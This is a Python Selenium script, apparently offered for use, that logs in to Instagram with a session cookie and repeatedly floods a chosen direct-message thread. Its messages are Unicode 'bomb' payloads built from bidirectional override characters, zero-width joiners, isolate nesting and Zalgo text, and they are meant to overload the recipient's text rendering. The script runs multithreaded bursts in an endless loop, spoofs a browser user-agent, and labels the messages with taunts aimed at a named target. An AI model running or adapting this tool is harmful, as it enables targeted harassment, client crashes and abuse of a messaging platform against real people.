# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (H-BOMB EDITION)
# 📅 STATUS: BiDi-OVERLOAD | DOUBLE-TAP SEND | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_h_bomb_payload(target_name):
    """The H-BOMB: BiDi-Marker Overload & Horizontal Complexity."""
    header = f"👑 PRAVEER PAPA 👑 KERNEL PANIC: [{target_name.upper()}] SHUTDOWN\n"
    
    # 💥 THE 'BiDi-BOMB' (Directional Markers + Variation Selectors)
    # This forces the layout engine to flip rendering every character.
    bidi_mix = ""
    for char in f"SYSTEM_FAILURE_{target_name.upper()}_VOID_":
        bidi_mix += f"\u202E{char}\u202D\ufe0f"
    
    # 💥 THE 'LAYOUT THRASHER' (Non-Breaking Spaces + ZWJ)
    # Prevents 'lazy-loading'; forces the browser to render as one atomic unit.
    thrash = "\u200D\u00A0\u2060" * 300
    
    # 💥 THE 'RECURSION VOID' (Isolate Nesting)
    void = "\u2066\u2067\u2068" * 80 

    lines = [header, thrash, void]
    
    # 💥 THE 'SKYSCRAPER 2.0' (Fraktur Script + Deep Zalgo)
    for i in range(50):
        # Alternate LTR/RTL prefixes to destroy the scroll-sync logic
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{prefix} 𝔓𝔄𝔙𝔈𝔈𝔔_OWNED ̸" * 15 + "̸" * 65)
    
    return "\n".join(lines)[:9950]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"hbomb_{MACHINE_ID}_{agent_id}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ H-BOMB DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    for _ in range(3): # Burst wave of 3
                        payload = get_h_bomb_payload(target_name)
                        
                        # 💥 DOUBLE-TAP SEND LOGIC
                        # 1. Inject via execCommand (fastest)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        
                        time.sleep(0.5)
                        
                        # 2. Click the 'Send' button directly via JavaScript
                        driver.execute_script("""
                            var btns = document.querySelectorAll('div[role="button"]');
                            for(var b of btns) {
                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                    b.click();
                                }
                            }
                        """)
                        # 3. Backup Enter key
                        box.send_keys(Keys.ENTER)
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 H-BOMB IMPACT DELIVERED", flush=True)
                    time.sleep(random.uniform(10, 15)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
